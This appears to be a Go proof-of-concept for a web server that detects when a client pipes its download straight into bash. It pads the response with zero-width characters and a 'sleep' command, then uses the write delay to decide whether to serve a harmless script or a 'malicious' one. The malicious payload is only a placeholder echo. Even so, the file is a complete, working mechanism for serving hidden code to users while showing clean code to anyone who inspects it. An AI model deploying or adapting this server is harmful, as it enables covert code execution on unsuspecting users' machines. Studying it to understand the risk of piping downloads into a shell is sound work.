package main

import (
	"fmt"
	"net/http"
	"strings"
	"time"
)

func main() {
	http.HandleFunc("/", handler)
	http.ListenAndServe(":8080", nil)
}

func handler(res http.ResponseWriter, req *http.Request) {
	detect_payload := []byte("echo Hello World!\nsleep 1\n# A comment" + strings.Repeat("\xe2\x80\x8b", 1024*1024) + "\n")

	malicious_payload := []byte("echo you have been pwned\n")
	harmless_payload := []byte("echo How are you?\n")

	res.Header().Set("Content-Type", "text/plain; charset=UTF-8")
	res.WriteHeader(200)
	started_detect := time.Now()
	res.Write(detect_payload)
	ended_detect := time.Now()
	elapsed := ended_detect.Sub(started_detect)
	if elapsed.Seconds() > 1 {
		fmt.Println("curl|bash detected. response time: ", elapsed)
		res.Write(malicious_payload)
	} else {
		fmt.Println("non curl|bash. response time: ", elapsed)
		res.Write(harmless_payload)
	}
}
